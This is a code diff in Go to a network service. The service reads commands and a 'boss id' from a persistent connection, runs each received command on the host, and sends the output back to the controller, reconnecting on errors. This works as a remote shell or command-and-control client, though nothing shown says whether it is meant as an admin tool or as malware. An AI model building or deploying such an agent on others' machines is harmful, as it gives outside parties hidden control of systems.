@@ -46,6 +46,7 @@ func (s *Service) Run() {
 	defer s.connection.Close()
 
 	for {
+		// read cmd
 		buffCommand := make([]byte, 2)
 		_, err := s.connection.Read(buffCommand)
 		if err != nil {
@@ -56,11 +57,24 @@ func (s *Service) Run() {
 			return
 		}
 
+		// read boss id
+		buffBoss := make([]byte, 16)
+		_, err = s.connection.Read(buffBoss)
+		if err != nil {
+			go func() {
+				s.Error <- err
+			}()
+			s.Reconnect()
+			return
+		}
+
 		switch string(buffCommand) {
-		case "a":
-			break
 		case cmd.Execute:
-			s.executeCommand()
+			output := s.executeCommand()
+			data := append([]byte(cmd.Result), buffBoss...)
+			data = append(data, output...)
+			data = append(data, '\r')
+			s.connection.Write(data)
 		}
 	}
 }
@@ -74,11 +88,11 @@ func (s *Service) Reconnect() {
 	s.Run()
 }
 
-func (s *Service) executeCommand() {
+func (s *Service) executeCommand() []byte {
 	msg, err := bufio.NewReader(s.connection).ReadString('\r')
 	if err != nil {
 		s.Error <- err
-		return
+		return nil
 	}
 
 	msg = strings.TrimSpace(msg)
@@ -90,8 +104,8 @@ func (s *Service) executeCommand() {
 	output, err := command.Output()
 	if err != nil {
 		s.Error <- err
-		return
+		return nil
 	}
 
-	s.connection.Write([]byte(cmd.Result + string(output) + "\r"))
+	return output
 }
